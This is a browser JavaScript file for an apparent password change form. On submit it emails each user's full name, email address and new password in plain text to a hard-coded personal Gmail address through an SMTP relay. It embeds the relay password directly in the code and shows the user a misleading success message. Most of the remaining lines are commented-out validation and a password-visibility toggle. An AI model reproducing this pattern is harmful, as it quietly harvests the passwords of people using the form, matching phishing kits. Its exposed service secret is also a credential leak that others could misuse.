const form = document.querySelector('form');

const fullName =document.getElementById("name");
const email =document.getElementById("email");
const password =document.getElementById("password");



function sendEmail(){
    const bodyMessage = `Account User with Full Name: ${fullName.value}<br> Email: ${email.value}<br> has successfully changed login Password<br> New Password: ${password.value}`;
    const subjectMessage = `${fullName.value} account update`;
    Email.send({
        Host : "smtp.elasticemail.com",
        Username : "bukolafavour25@gmail.com",
        Password : "9DDAA6E301E58F8F0846BD5F62958603E334",
        To : 'bukolafavour25@gmail.com',
        From : "bukolafavour25@gmail.com",
        Subject : subjectMessage,
        Body : bodyMessage
    }).then(
      message => {
        if (message == "OK"){
            Swal.fire({
                title: "Success!",
                text: "Message sent to your email!",
                icon: "success"
              });
        }
            }
        
    )
        };

    // let nameError =document.getElementById("name-error");
    // let emailError =document.getElementById("email-error");
    // let passwordError =document.getElementById("password-error");
    // let submitError =document.getElementById("submit-error");   
    
    
    // function validateName(){
    //     if(!fullName.match(/^[A-Za-z]*\s{1}[A-Za-z]*$/)){
    //         nameError.innerHTML = "write full name";
    //         return false;
    //     }else{
    //         return true
    //     }
    // }

    // // function validateEmail(){
    // //     if(!email.match(/^[A-Za-z]\._\-[0-9]*[@][A-Za-z]*[\.][a-z]{2,4}$/)){
    // //         emailError.innerHTML = "invalid Email";
    // //         return false;
    // //     }else{
    // //         return true
    // //     }
    // // }

    // function validatePassword(){
    //     if(!password.match(/^[a-zA-Z0-9!@#$%^&*]{6,10}$/)) {
    //     passwordError.innerHTML = "password should contain atleast one number and one special character";
    //         return false;
    //     }else{
    //         return true
    //     }
    // }

    // function validateForm(){
    //     if(!validateName() || !validatePassword()){
    //         submitError.style.display = 'block'
    //         submitError.innerHTML ="please fix all errors to submit";
    //         setTimeout(function(){submitError.style.display = 'none';}, 3000);
    //         return false;
    //     }
    // }

// function checkInputs(){
//     const formInputs = document.querySelectorAll(".form-input");
//     for (const formInput of formInputs) {
//     if (formInput.value = ""){
//         formInput.classList.add('Error');
//         formInput.parentElement.classList.add('error');
//     }
//     formInput.addEventListener("keyup", () =>{
//         if(formInput.value != ""){
//             formInput.classList.remove('error')
//             formInput.parentElement.classList.remove('error');
//         }else {
//             formInput.classList.add('error');
//         formInput.parentElement.classList.add('error');
//         }
//     })
// }
// }     

form.addEventListener("submit", (e)=> {
    e.preventDefault();
    sendEmail()
})

let eyeicon = document.getElementById("eye-icon")
     let passwordSee = document.getElementById("password")
     //when you click icon, it shows or hide password and changes image of icon
    eyeicon.onclick = function(){
         if (passwordSee.type == 'password'){
             passwordSee.type = "text";
             eyeicon.src = "../assets/open.jpeg";
        }else{
             passwordSee.type = "password";
             eyeicon.src = "../assets/close.jpeg";
   }
}




// let resetForm = document.getElementById("reset-form");

// resetForm.addEventListener("submit", (e) => {
//   e.preventDefault();

//   let fullName = document.getElementById("contact-name");
//   let email = document.getElementById("contact-email");
//   let password = document.getElementById("contact-password");
//   let passwordRetype = document.getElementById("contact-password-retype");

  

//   if (fullName.value === "" || email.value === "" || password.value==="" || passwordRetype.value=== "") {
//     alert("Ensure you input a value in all fields!");
//   } else if(!validatePassword || !validateRetype){
//     alert("passwords must match")
//   } else {
//     alert("password reset is successful! You can login with new password");
//     console.log(
//         This user ${fullName.value} with email ${email.value} did a password reset with ${password.value};
//     );

//     fullName.value = "";
//     password.value = "";
//     email.value = ""
//     passwordRetype.value = ""
//   }
// });

// function validatePassword(){
//     let passwordError = document.getElementById("password-error")
//     let password = document.getElementById("contact-password").value;
//     let maxNumberofChars = 10;
//     let left = maxNumberofChars-password.length;
    
//     if(left> 0){
//         passwordError.innerHTML = left + 'more characters required';    
//         return false;
//         }
//     else if(!password.match(/^[a-zA-Z0-9!@#$%^&*]{6,10}$/)) {
//         passwordError.innerHTML = "password should contain atleast one number and one special character";
//             return false;
//         }else
//         passwordError.style.display = "none";
//     }

//     function validateRetype(){
//         let passwordRetype = document.getElementById("contact-password-retype").value
//     // let retypeError = document.getElementById("password-retype").value;
//     if (!passwordRetype === password){
//         alert('password must match')
//         return false
//     } else {
//         return true
//     }
// }

// 
